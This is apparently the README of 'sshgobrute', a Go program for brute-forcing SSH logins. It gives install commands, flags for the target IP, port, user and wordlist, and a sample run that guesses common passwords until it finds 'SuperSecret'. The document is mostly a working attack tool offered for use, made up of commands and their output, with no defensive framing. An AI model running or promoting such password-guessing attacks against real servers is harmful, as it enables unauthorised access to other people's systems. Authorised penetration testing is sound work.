sshgobrute
==========

This is a program written in Golang for ssh brute force attacks, needs improvements
but works well and is really fast.

```bash
$ go get golang.org/x/crypto/ssh
```

```
$ go get github.com/aldenso/sshgobrute
$ ./sshgobrute --help
Usage of ./sshgobrute:
  -file string
        indicate wordlist file to use (default "wordlistfile.txt")
  -ip string
        indicate the ip address to brute force (default "192.168.125.100")
  -port int
        indicate port to brute force (default 22)
  -timer duration
        set timeout to ssh dial response (ex:300ms), don't set this too low (default 200ms)
  -user string
        indicate user to brute force (default "root")
```

```
$ ./sshgobrute -user username -timer=200ms
file: wordlistfile.txt
ip: 192.168.125.100
port: 22
user: username
timer: 200ms
additional args: []
Failed: 123456 ---Failed: 12345 ---Failed: money ---Failed: password ---Failed:
mickey ---Failed: password1 ---Failed: 123456789 ---Failed: 12345678 ---Failed:
.
.
.
iled: randy ---Failed: reddog ---Failed: rebecca ---
+++ Pattern found: SuperSecret +++

Completed in 60.273904113 senconds
+++ FOUND IT +++
```

If the sshd is using "PasswordAuthentication no" it won't work.
